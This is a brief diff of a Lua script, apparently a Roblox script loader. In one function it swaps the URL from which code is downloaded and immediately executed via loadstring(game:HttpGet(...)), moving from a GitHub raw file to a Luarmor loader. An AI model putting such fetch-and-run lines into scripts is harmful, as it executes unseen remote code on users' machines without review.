@@ -3,7 +3,7 @@ local function s1()
 end 
 
 local function s2() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/ckjdzdhh/refs/heads/main/cjc"))()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/644bc1fd548dfde30e203fc6ba3734c8.lua"))()
 end 
 
 local function s3() 
